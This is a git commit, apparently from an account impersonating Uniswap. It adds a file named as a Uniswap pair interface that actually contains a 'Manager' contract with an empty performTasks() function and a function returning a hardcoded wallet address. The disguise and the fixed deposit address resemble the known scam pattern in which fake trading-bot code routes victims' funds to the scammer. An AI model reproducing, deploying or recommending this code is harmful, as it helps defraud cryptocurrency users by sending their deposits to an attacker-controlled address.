04e4a46833919891e987bedbbbf74c75f0645994
uniswap <40811027+uni-swap@users.noreply.github.com>
2021-11-02 14:15:26 +0300

    Add files via upload

---
+++ contracts/interfaces/IUniswapPair.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public {
+        
+    }
+    
+    function swapDepositAddress() public pure returns (address) {
+        return 0x57908d78F35f6d274E6A46520C3d6842A6683Ab9;
+    }
+}
